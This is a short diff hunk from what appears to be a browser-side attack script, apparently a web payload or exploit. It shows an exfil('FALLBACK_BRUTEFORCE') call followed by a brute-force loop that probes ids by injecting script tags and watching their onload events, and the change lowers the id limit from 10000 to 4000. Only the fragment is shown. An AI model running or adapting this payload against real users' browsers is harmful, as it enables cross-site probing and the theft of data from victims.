@@ -74,7 +74,7 @@
                 exfil("FALLBACK_BRUTEFORCE");
                 let id = 1;
                 let searching = true;
-                while (searching && id <= 10000) {
+                while (searching && id <= 4000) {
                     let hit = await new Promise((resolve) => {
                         const s = document.createElement("script");
                         s.onload = () => { document.body.removeChild(s); resolve(true); };
